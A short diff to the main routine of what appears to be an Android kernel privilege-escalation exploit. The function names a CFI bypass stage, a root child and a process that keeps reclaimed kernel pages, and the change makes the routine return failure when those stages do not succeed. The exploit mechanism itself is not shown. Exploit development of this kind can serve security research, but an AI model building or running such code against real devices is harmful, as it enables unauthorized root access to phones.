@@ -214,7 +214,6 @@ int run_exploit(int argc, char **argv) {
   (void)argv;
 
   disable_rseq_for_thread();
-  set_unbuffer();
   set_limit();
   log_startup_context();
   init_ashmem_path();
@@ -247,10 +246,11 @@ int run_exploit(int argc, char **argv) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
-  if (atomic_load(&cfi_stage_done) && root_child_done) {
+  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
+  if (exploit_ok) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
   }
-  return 0;
+  return exploit_ok ? 0 : 1;
 }
